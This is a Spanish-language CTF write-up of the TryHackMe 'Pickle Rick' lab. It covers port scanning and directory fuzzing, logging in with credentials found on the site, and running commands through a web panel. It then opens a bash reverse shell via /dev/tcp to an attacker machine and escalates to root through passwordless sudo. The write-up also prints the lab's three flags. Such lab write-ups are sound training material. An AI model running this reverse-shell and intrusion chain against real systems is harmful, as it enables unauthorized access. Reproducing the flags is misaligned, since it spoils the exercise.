---
title: "TryHackMe - Pickle Rick "
date: 2025-10-10
lastmod: 2025-10-10
categories: [TryHackMe]
tags: [Linux, Web, TryHackMe, CTF, RCE]
toc: true
math: false
mermaid: true
image:
  path: assets\img\TryHackMe\PickleRick\rickymorty.png
---

## Target
- **Host:** `10.10.98.8`  
- **Plataforma:** TryHackMe   
- **Nivel:** <span style="color: #66bb6a;">Easy</span>
- **Objetivo:** Obtener los tres ingredientes de la pócima.

---

## Enumeración

Empiezo enumerando los puertos abiertos para identificar los servicios que corre la máquina. Como siempre, primero añado `picklerick.thm` a mi archivo `/etc/hosts` y, a continuación, lanzo `nmap`:

```bash
nmap -T4 -p- -sS -sV -sC -oA nmap/first picklerick.thm
```

| Parámetro | Descripción |
| :--- | :--- |
| **-T4** | Aumenta la velocidad del escaneo. |
| **-p-** | Escanea todos los puertos (1–65535). |
| **-sS** | SYN scan, rápido y eficiente para detectar puertos abiertos. |
| **-sV** | Detecta la versión del servicio. |
| **-sC** | Ejecuta los scripts NSE por defecto. |
| **-oA nmap/first** | Guarda la salida en tres formatos (`.nmap`, `.xml`, `.gnmap`). |
| **picklerick.thm** | Host resuelto mediante `/etc/hosts` (evita usar la IP directamente). |

A continuación, se muestra el resultado detallado del escaneo, donde encontramos dos puertos abiertos: el servicio SSH y el servicio web HTTP en Linux.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-10 10:27 BST
Nmap scan report for picklerick.thm (10.10.98.8)
Host is up (0.00020s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:B6:3D:06:BD:53 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
```


### Enumeración puerto 80

Web Principal

![Web principal](assets\img\TryHackMe\PickleRick\web.png)

Revisamos el codigo fuente de la pagina y vemos un nombre de usuario, `R1ckRul3s`.

![username](assets\img\TryHackMe\PickleRick\username.png)

Una vez analizado el código fuente, procedemos a realizar un **fuzzing de directorios** utilizando **FFUF** para buscar archivos o directorios ocultos en el servidor web.

```bash
ffuf -u http://picklerick.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt -fc 403
```

| Parámetro | Descripción                                                                                 |
| :-------- | :------------------------------------------------------------------------------------------ |
| **-u**    | Define la URL objetivo; `FUZZ` es la posición donde se inyectará la wordlist.               |
| **-w**    | Especifica la wordlist que contiene los nombres de archivos y directorios a probar.         |
| **-fc**   | Filtra códigos de estado HTTP. En este caso ignoramos `403` (Forbidden) para reducir ruido. |


A continuación, se muestra el resultado detallado del fuzzing, el cual reveló varios archivos y directorios importantes que no eran visibles a simple vista.

```text
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://picklerick.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

index.html              [Status: 200, Size: 1062, Words: 148, Lines: 38]
robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2]
.                       [Status: 200, Size: 1062, Words: 148, Lines: 38]
portal.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
login.php               [Status: 200, Size: 882, Words: 89, Lines: 26]
denied.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [17128/17128] :: Job [1/1] :: 499 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
La pagina robots.txt contiene algo de texto. ¿Qué puede ser?
`Wubbalubbadubdub`

![robots.txt](assets\img\TryHackMe\PickleRick\robotstxt.png)

Revisamos login.php, y efectivamente es un panel de login.
Probamos con los datos recopilados:
- Username: **R1ckRul3s**
- Password: **Wubbalubbadubdub**

![login](assets\img\TryHackMe\PickleRick\login.png)

Perfecto, redirige a portal.php que contiene un panel para ejecutar comandos de forma remota.
![portal](assets\img\TryHackMe\PickleRick\portal.png)

Primero identificamos que usuario es en el sistema sabiendo que el sistema operativo es Linux.

![whoami](assets\img\TryHackMe\PickleRick\whoami.png)

El usuario `www-data` es el usuario por defecto de Apache en distribuciones Linux (como Ubuntu).

| **Significado**         | **Implicación de Seguridad**                                                                                                                                                     |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Bajos Privilegios**   | Es un usuario sin permisos de administración. No puede instalar software, modificar archivos del sistema ni acceder a información sensible de otros usuarios por defecto. |
| **Usuario de Servicio** | Su única función es ejecutar el servidor web (como **Apache** o **Nginx**). Está restringido principalmente al directorio web (`/var/www/html`).                                 |

Enumeramos los directorios con el comando:
```bash
ls -la
```

| Parámetro | Descripción |
| :--- | :--- |
| **-la** | **Lista Detallada Completa:** Muestra el formato largo (`-l`, con permisos, propietario y tamaño) e incluye **todos los archivos** (`-a`), incluidos los ocultos (que empiezan con un punto, ej. `.bashrc`). |

![ls-la](assets\img\TryHackMe\PickleRick\ls-la.png)

Vemos dos archivos interesantes
- Sup3rS3cretPickl3Ingred.txt
- clue.txt

Probamos a mostrar el contenido del archivo con el comando `cat`, pero nos dice que el comando esta bloqueado por lo que probaremos con otro comando.
![cat](assets\img\TryHackMe\PickleRick\cat.png)

Probamos con el comando `less`, less es un visor de archivos de comandos de Linux/Unix que permite a los usuarios ver el contenido de archivos de texto.
![less](assets\img\TryHackMe\PickleRick\less.png)
Y nos muestra una posible flag o nombre de pocima: `mr. meeseek hair`, comprobamos y efectivamente es una flag (1/3).

Probamos con el archivo clue.txt, devuelve una pista.
![clue](assets\img\TryHackMe\PickleRick\clue.png)


Para facilitar la enumeración y el manejo de la sesión, generamos una Reverse Shell desde el panel RCE hacia nuestra máquina.

**Reverse Shell**

Máquina Atacante (Listener): Configuramos Netcat en el puerto 4000.
```bash
nc -lvnp 4000
```
![nc](assets\img\TryHackMe\PickleRick\nc.png)

Máquina Víctima (Payload): Elegimos esta sintaxis de Bash por ser la más fiable, ya que garantiza la correcta redirección de la entrada (STDIN), salida (STDOUT) y errores (STDERR) a través de la conexión TCP:
```bash
bash -c "bash -i &>/dev/tcp/ip-maquina-atacante/puerto-listening <&1"
```
![bash](assets\img\TryHackMe\PickleRick\bash.png)

Una vez conectados, obtenemos una shell de bajo privilegio como www-data.
![reverseshell](assets\img\TryHackMe\PickleRick\reverseshell.png)

## Escalada de privilegios

El siguiente paso es encontrar un vector para pasar de www-data a root.

SUDO Mal Configurado

Verificamos si nuestro usuario tiene permisos para ejecutar comandos como otros usuarios sin contraseña:
```bash
sudo -l
```
![sudo-l](assets\img\TryHackMe\PickleRick\sudo-l.png)

El resultado es:
```text
User www-data may run the following commands on ip-10-10-98-8:
(ALL) NOPASSWD: ALL
```
Esto significa que el usuario www-data puede ejecutar cualquier comando como cualquier usuario sin requerir una contraseña.

![flag2](assets\img\TryHackMe\PickleRick\flag2.png)

Obtenemos la segunda flag (2/3):
- `1 jerry tear`

Investigamos un poco mas los ficheros como root, y encontramos un archivo llamado 3rd.txt que contiene la tercera flag.

![flag3](assets\img\TryHackMe\PickleRick\flag3.png)

Obtenemos la tercera flag (3/3) Completado!
- `fleeb juice`
